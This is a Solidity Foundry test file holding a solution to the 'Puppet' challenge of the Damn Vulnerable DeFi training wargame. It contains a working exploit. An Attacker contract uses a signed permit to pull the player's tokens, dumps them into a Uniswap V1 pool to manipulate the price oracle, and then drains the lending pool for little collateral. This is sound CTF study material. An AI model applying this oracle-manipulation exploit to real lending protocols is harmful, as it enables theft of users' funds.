// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;


    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");

        startHoax(deployer);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy a exchange that will be used as the factory template
        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));

        // Deploy factory, initializing it with the address of the template exchange
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        // Deploy token to be traded in Uniswap V1
        token = new DamnValuableToken();

        // Create a new exchange for the token
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));

        // Deploy the lending pool
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        // Add initial token and ETH liquidity to the pool
        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            block.timestamp * 2 // deadline
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        // bytes32 separator = token.DOMAIN_SEPARATOR();
        // uint256 nonce = token.nonces(player);
        // console.logBytes32(separator);
        // console.log(nonce);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapV1Exchange.factoryAddress(), address(uniswapV1Factory));
        assertEq(uniswapV1Exchange.tokenAddress(), address(token));
        assertEq(
            uniswapV1Exchange.getTokenToEthInputPrice(1e18),
            _calculateTokenToEthInputPrice(1e18, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        assertEq(lendingPool.calculateDepositRequired(1e18), 2e18);
        assertEq(lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    Attacker public attackContract;
    
    function test_puppet() public checkSolvedByPlayer {
        // Step 1: Predict the address where the attacker contract will be deployed
        // The address is determined using keccak256 hashing of the deployer's address and nonce.
        // Here, nonce is 0 because this is the first contract being deployed from the player's address.
        address predictedAddress = address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xd6),             // RLP encoding prefix for the deployer's address
            bytes1(0x94),             // RLP encoding prefix for the nonce
            player,                   // The player's address (deployer)
            bytes1(0x80)              // Nonce value = 0
        )))));
    
        // Hardcoded DOMAIN_SEPARATOR for the token contract
        // This separator is part of the EIP-712 signature process for the permit function.
        bytes32 separator = 0x848001d4ba90c8d7fa503473554c6f8dc777cbf042f4c1bb88afcd6914009599;
    
        // Step 2: Construct the EIP-2612 digest for the permit function
        // This digest combines the DOMAIN_SEPARATOR and the hashed permit data.
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",             // EIP-191 prefix
                separator,              // DOMAIN_SEPARATOR (specific to the token contract)
                keccak256(
                    abi.encode(
                        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"), // Permit type hash
                        player,           // Owner of the tokens (player's address)
                        predictedAddress, // Spender (attacker contract's predicted address)
                        1000e18,          // Value to approve (1,000 tokens)
                        0,                // Nonce for the player's account (starts at 0)
                        type(uint256).max // Deadline for the permit (maximum possible value)
                    )
                )
            )
        );
    
        // Step 3: Sign the digest using the player's private key
        // This creates an ECDSA signature consisting of v, r, and s components.
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);
    
        // Step 4: Deploy the attacker contract
        // Pass the token address, signature (v, r, s), and other necessary parameters to the attacker contract.
        attackContract = new Attacker{value: player.balance}(
            address(token),           // Token contract address
            v, r, s,                  // ECDSA signature components
            address(uniswapV1Exchange), // Uniswap V1 exchange address
            recovery,                 // Address to send recovered tokens
            address(lendingPool)      // Puppet lending pool address
        );
    }


    // Utility function to calculate Uniswap prices
    function _calculateTokenToEthInputPrice(uint256 tokensSold, uint256 tokensInReserve, uint256 etherInReserve)
        private
        pure
        returns (uint256)
    {
        return (tokensSold * 997 * etherInReserve) / (tokensInReserve * 1000 + tokensSold * 997);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All tokens of the lending pool were deposited into the recovery account
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    /**
     * @dev Attacker contract constructor. Executes the exploit by:
     *      - Using the permit function to authorize the attacker contract
     *      - Transferring tokens to the attacker contract
     *      - Manipulating Uniswap prices and draining the lending pool
     * @param tokenAddress Address of the DamnValuableToken contract
     * @param v ECDSA signature component
     * @param r ECDSA signature component
     * @param s ECDSA signature component
     * @param uniswapExchange Address of the Uniswap V1 exchange
     * @param recoveryAddress Address where drained tokens will be sent
     * @param lendingPoolAddress Address of the PuppetPool contract
     */
    constructor(
        address tokenAddress,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address uniswapExchange,
        address recoveryAddress,
        address lendingPoolAddress
    ) payable {
        // Step 1: Use the permit function to approve the attacker contract to spend tokens
        DamnValuableToken(tokenAddress).permit(
            msg.sender,             // Owner (signer)
            address(this),          // Spender (attacker contract)
            1000e18,                // Amount to approve
            type(uint256).max,      // Deadline
            v, r, s                 // ECDSA signature
        );

        // Step 2: Transfer approved tokens from the player to the attacker contract
        DamnValuableToken(tokenAddress).transferFrom(msg.sender, address(this), 1000e18);

        // Step 3: Approve the Uniswap exchange to spend tokens from the attacker contract
        DamnValuableToken(tokenAddress).approve(uniswapExchange, 1000e18);

        // Step 4: Swap tokens for ETH to manipulate the Uniswap price
        IUniswapV1Exchange(uniswapExchange).tokenToEthSwapInput(1000e18, 1, type(uint256).max);

        // Step 5: Borrow all tokens from the lending pool using manipulated prices
        PuppetPool(lendingPoolAddress).borrow{value: address(this).balance}(100_000e18, recoveryAddress);
    }

    /**
     * @notice Fallback function to accept ETH
     */
    fallback() external payable {}
}





